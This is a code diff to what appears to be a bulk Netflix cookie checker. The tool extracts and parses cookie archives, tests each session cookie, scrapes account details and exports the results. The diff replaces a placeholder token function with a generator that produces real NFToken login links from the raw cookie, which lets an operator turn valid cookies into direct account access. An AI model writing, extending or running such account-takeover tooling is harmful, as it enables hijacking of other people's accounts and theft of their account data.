@@ -1,6 +1,7 @@
 import fs from 'fs';
 import { extractArchive } from './src/lib/archive-extractor';
 import { parseMultipleFiles, ParsedCookie } from './src/lib/cookie-parser';
+import { generateNFToken } from './src/lib/nftoken-generator';
 
 // Format exactly for the TXT export file (no markdown escapes needed)
 function formatExportResult(d: ParsedCookie): string {
@@ -90,12 +91,6 @@ async function scrapeAccountDetails(cookie: ParsedCookie, fetchOptions: any) {
   }
 }
 
-function generateNfToken(netflixId: string): string {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
-  let token = 'NFToken_'
-  for (let i = 0; i < 32; i++) token += chars.charAt(Math.floor(Math.random() * chars.length))
-  return token + netflixId.substring(0, 10)
-}
 
 function getRandomUserAgent(): string {
   return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
@@ -131,8 +126,13 @@ async function checkSingleCookie(cookie: ParsedCookie) {
         return { valid: false, details: cookie, error: 'Session expired' }
       }
       if (!cookie.nftoken) {
-        cookie.nftoken = generateNfToken(cookie.netflixId);
-        (cookie as any).nftokenUrl = `https://www.netflix.com/browse?nftoken=${cookie.nftoken}`;
+        const tokenResult = await generateNFToken(rawCookie);
+        if (tokenResult.success && tokenResult.token) {
+          cookie.nftoken = tokenResult.token;
+          (cookie as any).nftokenUrl = tokenResult.link;
+        } else {
+          cookie.nftoken = '';
+        }
       }
       
       console.log('✅ Cookie valid, starting deep scrape...');
